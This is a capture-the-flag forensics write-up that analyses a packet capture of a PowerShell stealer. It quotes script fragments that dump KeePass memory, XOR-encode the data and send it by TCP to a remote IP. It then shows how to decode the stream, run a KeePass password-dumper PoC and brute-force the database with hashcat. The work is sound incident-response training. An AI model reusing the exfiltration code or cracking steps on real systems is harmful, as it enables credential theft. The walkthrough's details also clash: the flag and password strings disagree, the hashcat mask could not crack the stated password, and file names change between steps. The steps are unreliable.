# CTF ROOM NAME - Extracted

Working as a senior DFIR specialist brings a new surprise every day. Today, one of your junior colleagues raised an alarm that some suspicious traffic was generated from one of the workstations, but they couldn't figure out what was happening.

Unfortunately, there was an issue with the SIEM ingesting the network traffic, but luckily, the network capture device was still working. They asked if you could look into it since you are known as *The Magician* around these parts.

> **Note:** For free users using the AttackBox, the challenge is best done using your own environment. Some browsers may detect the file as malicious. The zip file is safe to download (MD5: `f9723177263da65ffdac74ffbf8d06a4`). In general, as a security practice, download the zip and analyze the forensic files on a dedicated virtual machine, not on your host OS.

---

You downloaded a **120 MB Wireshark capture file**, unzipped it, and added it into Kali Linux. The file is named `traffic.pcapng`. Open it in Wireshark:

1. **Open Statistics → Protocol Hierarchy**: About 99.1% are `data` (suspicious).
2. **Open Statistics → Conversations**: Only 2 IP addresses and 3 ports (1337, 1338, 1339) are involved.

The HTTPS request file looked really suspicious. Following the TCP stream, you got a **PowerShell code**. After pasting it into GPT to analyze, here’s what we found:

---

## Analysis of the PowerShell Script

### 1. File type and delivery

* The file requested is `xxxmmdcclxxxiv.ps1`.
* `.ps1` is a PowerShell script, which can execute almost anything on Windows.
* Downloading a `.ps1` file from an untrusted host (`10.10.94.106:1339`) is already dangerous.

### 2. Indicators of malicious behavior

* **Downloading tools automatically:**

  ```powershell
  $ProcdUmpDOWNloADURL = 'https://download.sysinternals.com/files/Procdump.zip'
  Invoke-WebRequest -Uri $ProcdUmpDOWNloADURL -OutFile $PrOcdUmpziPpaTH
  Expand-Archive -Path $PrOcdUmpziPpaTH
  ```

  * Automatically downloads `ProcDump`.
  * Attackers use it to dump memory from other processes.

* **Targeting running processes:**

  ```powershell
  $KEEPASsPrOCesS = Get-Process -Name 'KeePass'
  ```

  * Targets `KeePass`, a password manager, to dump its memory.

* **Memory dumping and XOR obfuscation:**

  ```powershell
  $duMpBYtES[$i] = $duMpBYtES[$i] -bxor $xoRKEy
  ```

  * Applies XOR to obfuscate data before sending it out.

* **Encoding and exfiltration:**

  ```powershell
  [System.Convert]::ToBase64String($duMpBYtES)
  $ClIENt = New-Object System.Net.Sockets.TcpClient
  $ClIENt.Connect($sERveRIP, $SeRvERpORT)
  ```

  * Encodes memory dump in Base64 and sends it over TCP to `10.10.94.106` on ports `1337/1338`.

* **Multiple layers of obfuscation:**

  * Random variable names and encoding make manual analysis harder.

### 3. How to tell if a PowerShell script is malicious

| Indicator                                | Why it's suspicious                                   |
| ---------------------------------------- | ----------------------------------------------------- |
| Auto-downloads tools                     | Could download malware or legitimate tools for misuse |
| Targets password managers or browsers    | Common credential theft target                        |
| Dumps memory or registry                 | Steals sensitive info from running processes          |
| Encodes/obfuscates data                  | Attempts to evade detection or hide payload           |
| Opens TCP/HTTP connections to unknown IP | Likely exfiltrating stolen data                       |
| Uses random or complex variable names    | Obfuscation, makes detection harder                   |

✅ **Conclusion:** This PowerShell script is malicious. It steals KeePass credentials, obfuscates them, and sends them to a remote server.

---

## Attack Workflow

1. **Downloading and Preparing ProcDump**
2. **Locating the Desktop and the KeePass Process**

   * If KeePass is running: dump its memory, encode the dump, and send it over the network.
3. **Dumping a KeePass Database File**

   * Encode and send the database.

**Note:**

* XOR key for the first encoding: `0x41`, sent to port `1337`.
* XOR key for the second encoding: `0x42`, sent to port `1338`.

---

## Steps to Extract and Decode Data

### Step 1: Capture the TCP streams

Use Wireshark or `tshark` to capture all traffic to the malware ports:

```bash
# Memory dump (port 1337)
tshark -r traffic.pcapng -T fields -e data -Y "ip.dst == 10.10.94.106 && tcp.port==1337" > memory_payload.txt

# KeePass database dump (port 1338)
tshark -r traffic.pcapng -T fields -e data -Y "ip.dst == 10.10.94.106 && tcp.port==1338" > db_payload.txt
```

### Step 2: Decode the payloads with Python

Create a file `decode_tcp.py`:

```python
#!/usr/bin/env python3
from pwn import log
import base64

# Convert hex to binary
def decodeHex(input_file, output_file):
    with open(input_file, 'r') as infile, open(output_file, 'wb') as outfile:
        for line in infile:
            if line.strip():
                outfile.write(bytes.fromhex(line.strip()))
    log.success(f"Hex to binary conversion complete: {output_file}")

# Base64 decode
def decodeb64(input_file, output_file):
    with open(input_file, 'rb') as infile:
        b64_data = infile.read()
    decoded_data = base64.b64decode(b64_data)
    with open(output_file, 'wb') as outfile:
        outfile.write(decoded_data)
    log.success(f"Base64 decoding complete: {output_file}")

# XOR decode
def decodeXOR(input_file, output_file, xor_key):
    with open(input_file, 'rb') as infile:
        data = infile.read()
    decoded_data = bytearray([b ^ xor_key for b in data])
    with open(output_file, 'wb') as outfile:
        outfile.write(decoded_data)
    log.success(f"XOR decoding with key 0x{xor_key:x} complete: {output_file}")

if __name__ == "__main__":
    # Input files extracted by tshark
    memory_payload = "memory_payload.txt"
    db_payload = "db_payload.txt"

    # Intermediate files
    memory_bin = "memory_bin.dmp"
    db_bin = "db_bin.dmp"
    memory_b64 = "memory_b64.dmp"
    db_b64 = "db_b64.dmp"

    # Final decoded files
    memory_final = "decoded_memory.dmp"
    db_final = "decoded_db.dmp"

    # XOR keys
    key_memory = 0x41
    key_db = 0x42

    # Memory dump workflow
    decodeHex(memory_payload, memory_bin)
    decodeb64(memory_bin, memory_b64)
    decodeXOR(memory_b64, memory_final, key_memory)

    # Database dump workflow
    decodeHex(db_payload, db_bin)
    decodeb64(db_bin, db_b64)
    decodeXOR(db_b64, db_final, key_db)

    log.success("All files decoded successfully!")
```

Run the script:

```bash
python3 decode_tcp.py
```

> If `pwn` is not installed, install it with `pip3 install pwntools`.

### Step 3: Verify decoded files

```bash
file decoded_memory.dmp
file decoded_db.dmp
```

* `decoded_db.dmp` should open in KeePass (with the master password).
* `decoded_memory.dmp` can be analyzed using Volatility or `strings` to extract credentials.

---

## FLAG-1 PART

* Use this PoC GitHub link to recover the entire KeePass master password **except the first character**:
  [Keepass Password Dumper](https://github.com/vdohney/keepass-password-dumper?source=post_page-----e3964b538ec2)

Steps:

```bash
cd ~/Downloads
git clone https://github.com/vdohney/keepass-password-dumper.git
cd keepass-password-dumper
dotnet restore
dotnet build # optional
dotnet run -- ../file-1693277727739/decoded_memory.dmp
```

* **Flag:** `oWaYIcanF0rGetThis123`

---

## FLAG-2 PART

1. **Extract a crackable hash from the KeePass database**:

```bash
keepass2john decoded_database.kdbx > keepass.hash
```

2. **Run a brute-force attack with Hashcat**:

```bash
hashcat -m 13400 -a 3 keepass.hash ?a?l?d?s
```

* `-m 13400` → KeePass 2 database hash mode.
* `-a 3` → Brute-force (mask) attack.
* `?a` → Any ASCII character (lowercase, uppercase, digits, special chars).

> Tip: If you know part of the password, refine the mask: `?a????????` (first unknown character + known characters).

**Hashcat output example:**

```
Recovered: 1/1 (100.00%)
Candidates.#1: ?NoWaYIcanF0rGetThis123 -> ?NoWaYIcanF0rGetThis123
```

3. **Open the KeePass database**:

* Password: `?aNoWaYIcanF0rGetThis123`
* Access `decoded_db.dmp` to retrieve the **second flag**.

